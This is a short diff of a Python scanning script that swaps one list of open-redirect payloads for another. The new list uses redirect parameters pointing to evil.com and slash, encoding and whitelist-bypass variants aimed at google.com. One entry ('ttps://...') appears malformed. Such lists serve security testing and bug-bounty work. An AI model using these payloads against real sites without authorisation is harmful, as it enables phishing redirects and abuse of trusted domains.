@@ -44,17 +44,21 @@ openredirect_params = [
 ]
 
 openredirect_payloads = [
-    "bountystrike.io",
-    "/bountystrike.io",
-    "/http://bountystrike.io",
-    "//bountystrike.io",
-    "///bountystrike.io",
-    "////bountystrike.io",
-    "%2fbountystrike.io",
-    "%2f$2fbountystrike.io",
-    "%2fbountystrike.io%2f%2f",
-    "$2f%2fbountystrike.io%2f%2f",
-    "%2fbountystrike.io//",
+    "?next=evil.com",
+    "?url=evil.com",
+    "?target=evil.com",
+    "?rurl=evil.com",
+    "?dest=evil.com",
+    "?redir=evil.com",
+    "redirect_uri=evil.com",
+    "//www.whitelisteddomain.tld@google.com/%2f..",
+    "///google.com/%2f..",
+    "///www.whitelisteddomain.tld@google.com/%2f..",
+    "////google.com/%2f..",
+    "////www.whitelisteddomain.tld@google.com/%2f..",
+    "ttps://google.com/%2f..",
+
+
 ]
 
 def build_openredirect_list(url: str):
